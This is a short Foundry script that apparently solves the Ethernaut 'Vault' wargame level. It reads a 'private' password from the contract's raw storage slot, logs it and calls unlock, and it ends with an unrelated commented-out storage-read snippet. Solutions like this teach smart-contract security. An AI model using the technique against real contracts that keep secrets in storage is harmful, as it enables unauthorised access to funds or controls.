// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "ds-test/test.sol";
import "src/Vault/Vault.sol";

contract VaultScript is Script, DSTest {
    address INSTANCE_LEVEL_ADDRESS = 0x84269C717CfE1f73000193bBC50EF474A54eC58b;

    function run() external {
      vm.startBroadcast();
      Vault vault = Vault(payable(INSTANCE_LEVEL_ADDRESS));
      bytes32 password = bytes32(vm.load(INSTANCE_LEVEL_ADDRESS,bytes32(uint256(1))));
      emit log_named_bytes32('pass: ', password);
      vault.unlock(password);
      
      vm.stopBroadcast();
    }
}

/**
bytes32 slotData = stdstore
            .target(address(arbitrageExecutor))
            .sig(arbitrageExecutor.WBNB.selector)
            .read_bytes32();
        address myAddress = address(uint160(uint256(slotData)));
 */
